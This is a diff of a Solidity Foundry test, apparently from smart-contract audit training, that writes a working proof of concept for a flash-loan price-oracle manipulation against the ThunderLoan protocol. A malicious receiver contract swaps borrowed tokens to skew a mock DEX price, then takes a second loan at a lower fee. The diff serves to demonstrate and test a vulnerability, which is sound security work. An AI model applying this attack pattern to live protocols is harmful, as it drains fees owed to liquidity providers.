@@ -315,7 +315,7 @@ contract ThunderLoanTest is BaseTest {
         // Create a TSwap Dex between WETH / Token A
         address tswapPool = pf.createPool(address(tokenA));
 
-        // we are going to use proxy address as the thunder loan contract
+        // we are going to use proxy address as the `thunderLoan` contract
         thunderLoan = ThunderLoan(address(proxy));
 
         // initialize
@@ -326,37 +326,44 @@ contract ThunderLoanTest is BaseTest {
         // we have to mint the liquidator USDC and tokenA
         vm.startPrank(liquidityProvider);
 
-        tokenA.mint(address(liquidityProvider), 100e18);
-        tokenA.approve(address(tswapPool), 100e18);
+        uint256 tokenAToDeposit = 100e18;
+        uint256 wethToDeposit = 100e18;
 
-        weth.mint(address(liquidityProvider), 100e18);
-        weth.approve(address(tswapPool), 100e18);
+        tokenA.mint(address(liquidityProvider), tokenAToDeposit);
+        tokenA.approve(address(tswapPool), tokenAToDeposit);
 
-        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
+        weth.mint(address(liquidityProvider), wethToDeposit);
+        weth.approve(address(tswapPool), wethToDeposit);
+
+        BuffMockTSwap(tswapPool).deposit(wethToDeposit, 100e18, tokenAToDeposit, block.timestamp);
         // Ratio 100 WETH & 100 TokenA
         // meaning ratio is `1:1`
 
         vm.stopPrank();
 
-        // 2. Deposit tokens to the thunder Loan protocol
+        // 3. Deposit tokens to the thunderLoan protocol
         // To deposit tokens to, the token has to be allowed
         thunderLoan.setAllowedToken(tokenA, true);
+
+        uint256 tokenAToDepositOnThunderLoan = 1000e18;
 
         // let's deposit
         vm.startPrank(liquidityProvider);
 
-        tokenA.mint(address(liquidityProvider), 1000e18);
-        tokenA.approve(address(thunderLoan), 1000e18);
+        tokenA.mint(address(liquidityProvider), tokenAToDepositOnThunderLoan);
+        tokenA.approve(address(thunderLoan), tokenAToDepositOnThunderLoan);
 
         //deposit
-        thunderLoan.deposit(tokenA, 1000e18);
+        thunderLoan.deposit(tokenA, tokenAToDepositOnThunderLoan);
+        // thunderLoan has tokenA of 1000e18
+        // now anyone can take a flash loan of tokenA for max of 1000e18
 
         vm.stopPrank();
 
         // 100 WETH & 100 TokenA in TSwap
         // 1000 TokenA in ThunderLoan
 
-        // 3. We are going to take 2 flash loans
+        // 4. We are going to take 2 flash loans
         //      a. To nuke the price of WETH/tokenA on TSwap
         //      b. To show that doing so, greatly reduces the fees we pay on thunderloan
 
@@ -369,17 +376,53 @@ contract ThunderLoanTest is BaseTest {
         // Let's take another flash loan of 50 tokenA
         // when we are taking the second flash loan
         // fee will be calculated based on the TSwap oracle which the user already manipulated
-        // therfore the user will take out the flash for very cheap `fee`
+        // fee will be calculated based on how many tokenA is present
+        // since more tokenA is present, fee will be cheap
+        // therfore the user will take out the flash loan for very cheap `fee`
         // Due to this oracle manipulation
         // the liquidity providers will get very less interest in return
         // which will disrupt the protocol
 
-        // let's take the first flash loan
+        // let's calculate the fee if TSwap is not manipulated
         uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
         console2.log("Normal fee is", normalFeeCost); // 0.296147410319118389
+        // If we take a flash loan for `100e18` of token A, this will be the cost
+        // but this user is taking 2 flash loans of 50 tokenA
+        // adding both the fee for flash loan should be equal as the above
 
         uint256 amountToBorrow = 50e18;
-        // thunderLoan.flashloan();
+
+        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(
+            tswapPool, address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
+        );
+
+        vm.startPrank(user);
+        tokenA.mint(address(flr), 100e18);
+
+        // first flashloan
+        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
+        // the above line will call the flashloan on thunderLoan
+        // thunderLoan will call the `executeOperation` inside the `flr` contract
+
+        vm.stopPrank();
+
+        uint256 attackFee = flr.feeOne() + flr.feeTwo();
+        console2.log("Fee for 1st flash loan", flr.feeOne());
+        console2.log("Fee for 2nd flash loan", flr.feeTwo());
+        console2.log("Attack Fee", attackFee);
+        assertLt(attackFee, normalFeeCost);
+
+        // If we take a flash loan for `100e18` of token A, cost is
+        // flash loan fee for 100 tokenA                                0.296147410319118389
+        // but this user is taking 2 flash loans of 50 tokenA
+        // first flashloan cost                                           148073705159559194
+        // second flash loan cost                                          66093895772631111
+        // adding both the fee for flash loan should be equal as the above
+        // adding 2 flash loans                                          0.214167600932190305
+
+        // we can see that for second flash loan, fee is very cheap
+        // eventhough the flash loan amount is same
+        // after adding 2 fees, it will be very less than the fee for taking flash loan for 100 tokenA
     }
 }
 
@@ -390,8 +433,8 @@ contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
     BuffMockTSwap tswapPool;
     address repayAddress;
     bool attacked;
-    uint256 feeOne;
-    uint256 feeTwo;
+    uint256 public feeOne;
+    uint256 public feeTwo;
 
     constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
         tswapPool = BuffMockTSwap(_tswapPool);
@@ -399,11 +442,13 @@ contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
         repayAddress = _repayAddress;
     }
 
+    // when the first flash loan is taken
+    // `thunderLoan`contract will call this function
     // this is the function which will perform all the malicious operations
     // 1. Swap tokenA borrowed for WETH
     // 2. Take out Another flash loan, to show the difference in fee
     function executeOperation(
-        address token,
+        address token, // this token is tokenA in this instance
         uint256 amount,
         uint256 fee,
         address, /*initiator*/
@@ -415,12 +460,51 @@ contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
         if (!attacked) {
             // 1. Swap tokenA borrowed for WETH
             // 2. Take out Another flash loan, to show the difference in fee
-
             feeOne = fee;
             attacked = true;
+
+            // we are going to deposit 50 tokenA and we need to get know how many weth we can expect
+            // already weth and tokenA reserve contain 100e18
+            // to know how much weth we can expect we can call `getOutputAmountBasedOnInput` and say we are going to
+            // deposit `50e18` of tokenA and totalSupply of weth and tokenA which is 100e18 each
+            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
+            IERC20(token).approve(address(tswapPool), 50e18);
+
+            // now we are swapping tokenA for weth
+            // we will get whatever the equivalent of `weth` for 50e18 tokenA
+            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
+            // which means we will have 150 tokenA and less weth
+            // this will tank the price of tokenA, because it has more
+            // now when a user takes a flash loan
+            // `fee` will be calculated based on the tokenA, since more tokenA is present
+            // `fee` will be very cheap
+
+            // we call a second flash loan
+            // we are taking second flash loan for `tokenA 50e18`
+            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
+
+            // once the flashloan is called again
+            // `thunderLoan` will call `executeOperation` again
+            // but this time `attacked` will be true
+            // therfore `else` will get executed
+
+            // repaying the first flash loan
+            // IERC20(token).approve(address(thunderLoan), amount + fee);
+            // thunderLoan.repay(IERC20(token), amount + fee);
+            IERC20(token).transfer(address(repayAddress), amount + fee);
         } else {
             // calculate the fee and repay
+
+            // when second flash is called, this block of code will get executed
+            // `executeOperation` will be called from `thunderLoan` with `fee` and other params
+            feeTwo = fee;
+
+            // repaying the second flash loan
+            // IERC20(token).approve(address(thunderLoan), amount + fee);
+            // thunderLoan.repay(IERC20(token), amount + fee);
+            IERC20(token).transfer(address(repayAddress), amount + fee);
         }
+        return true;
     }
 }
 
